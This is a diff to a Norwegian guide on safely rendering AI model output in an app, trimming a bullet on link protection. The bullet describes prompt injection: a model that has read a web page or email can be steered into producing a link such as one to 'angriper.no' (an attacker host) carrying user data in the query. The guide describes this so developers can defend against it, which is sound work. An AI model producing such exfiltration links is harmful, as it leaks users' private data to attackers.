@@ -120,10 +120,9 @@ aldri gjennom `innerHTML`. To måter å strømme på:
 - Lenker `target="_blank" rel="noopener"`; bare `http(s)`.
 - **Lenkevern for modelltekst.** En modell som har lest en nettside eller en e-post,
   kan være styrt av den, og en lenke som `https://angriper.no/?d=<data>` lekker på ett
-  trykk. Vis alltid det ekte vertsnavnet ved lenken (fra `new URL()`, som gir
-  punycode, så et kyrillisk navn ikke ligner det ekte), og gjør lenker med query,
-  hash, port, brukerinfo eller en lang sti om til ren tekst med en kort merknad.
-  Sjekk råteksten for `?` og `#` også: `URL` glemmer et tomt `?`.
+  trykk. Vis alltid det ekte vertsnavnet, og gjør lenker med query, hash, port,
+  brukerinfo eller lang sti om til ren tekst. Detaljene: skillen `agent-i-appen`,
+  reference/fremmed-tekst.md.
 
 ## Skråstrek-kommandoer
 
